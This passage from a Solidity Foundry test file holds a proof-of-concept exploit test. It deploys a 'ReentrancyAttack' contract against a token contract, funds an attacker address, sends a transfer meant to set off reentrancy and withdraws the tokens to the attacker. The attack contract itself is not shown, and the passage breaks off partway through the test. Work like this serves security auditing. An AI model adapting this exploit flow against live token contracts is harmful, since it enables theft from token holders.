        address feeAccumulator = address(0x123);
        deal(TARGET, feeAccumulator, threshold * 2);
        vm.prank(feeAccumulator);
        IERC20(TARGET).transfer(TARGET, threshold);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Deploy the attack contract
        attackContract = new ReentrancyAttack(TARGET);

        // Get initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Give attacker some tokens
        deal(TARGET, attacker, 1000 * 10**9);

        // Ensure token contract has some balance for fees (optional)
        // The attack should work even without triggering swapAndLiquify

        // Start the attack with limited reentrancy (2 calls total)
        attackContract.startAttack(2);

        // Make the initial transfer to trigger reentrancy
        // Use a small amount to avoid triggering swapAndLiquify
        uint256 attackAmount = 50 * 10**9;

        vm.prank(attacker);
        bool success = IERC20(TARGET).transfer(address(attackContract), attackAmount);
        require(success, "Initial transfer failed");

        // Complete the attack
        attackContract.completeAttack();

        // Withdraw any tokens from attack contract
        uint256 attackContractBalance = IERC20(TARGET).balanceOf(address(attackContract));
        if (attackContractBalance > 0) {
            attackContract.withdrawTokens(attacker, attackContractBalance);
        }

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);

        // The attack might not increase balance due to fees, but let's check if reentrancy occurred
